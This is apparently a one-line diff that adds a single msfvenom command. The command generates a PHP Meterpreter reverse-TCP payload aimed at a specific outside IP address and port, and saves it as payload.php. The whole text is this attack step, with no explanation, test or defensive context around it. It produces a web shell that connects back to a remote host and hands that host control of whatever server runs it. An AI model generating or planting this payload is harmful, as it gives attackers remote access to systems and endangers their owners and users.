@@ -1,0 +1,1 @@
+msfvenom -p php/meterpreter/reverse_tcp LHOST=45.63.17.18 LPORT=8084 -o payload.php
